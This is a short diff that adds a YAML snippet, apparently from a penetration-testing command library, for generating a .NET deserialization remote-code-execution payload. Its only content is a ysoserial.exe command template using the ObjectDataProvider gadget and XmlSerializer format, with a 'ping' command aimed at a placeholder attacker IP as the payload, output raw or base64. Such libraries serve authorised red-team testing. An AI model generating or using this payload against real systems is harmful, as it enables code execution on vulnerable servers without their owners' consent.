@@ -1,0 +1,11 @@
+---
+metadata:
+  filename: "generate-deserialization-rce-ysoserial-net-xml.yaml"
+  tags: ["windows"]
+  created: "2025-07-09"
+  author: "@Anakles"
+
+content: |
+  <%=$(esh variables/delivery_path_windows)%>\Release\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "ping -n 5 <%=$(esh variables/attacker_ip)%>" -o <raw|base64>
+
+
